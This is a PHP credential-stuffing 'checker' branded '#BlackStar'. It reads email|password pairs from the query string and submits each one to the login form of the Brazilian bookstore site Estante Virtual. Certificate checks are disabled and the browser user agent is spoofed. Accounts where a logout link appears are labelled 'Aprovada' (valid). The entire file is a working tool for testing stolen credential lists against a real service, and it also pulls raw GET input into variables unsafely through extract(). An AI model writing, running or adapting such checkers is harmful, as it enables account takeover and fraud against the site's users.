<?php

error_reporting(0);
set_time_limit(0);
DeletarCookies();

extract($_GET);

function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}

function multiexplode ($delimiters,$string) {

    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;
}


list($email, $senha) = multiexplode(array(";","|",":"," » "," "),$linhas);

function dados($string, $start, $end){ 
    $str = explode($start, $string); 
    $str = explode($end, $str[1]); 
    return $str[0]; 
} //funcao para puxar os dados


        $ch = curl_init();  //iniciar o cURL
        curl_setopt($ch, CURLOPT_URL, "https://www.estantevirtual.com.br/login");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/teste.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: www.estantevirtual.com.br',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
        'Connection: keep-alive',
        'Origin: https://www.estantevirtual.com.br',
        'Referer: https://www.estantevirtual.com.br/login',
        'Content-Type: application/x-www-form-urlencoded',
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
        ));
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'username='.$email.'&password='.$senha.'&persistent=1&target=https%3A%2F%2Fwww.estantevirtual.com.br&origin=form');
        $result = curl_exec($ch);
        //echo $result

        if (strpos($result, '"/logout"') !== false) {

            echo "<b><i><font style='color: green;'>Aprovada ✔&nbsp;&nbsp;</font></i>  $email|$senha | <font style='color: MidnightBlue;'>#BlackStar©</font></b>";
        }else{
             echo "<font style='color: red;'>Reprovada ❌</font>  $email|$senha <font style='color: DeepSkyBlue;'>#BlackStar©</font>";
        }

             if (file_exists(getcwd().'/teste.txt')) {
            unlink(getcwd().'/teste.txt');
        }
?>

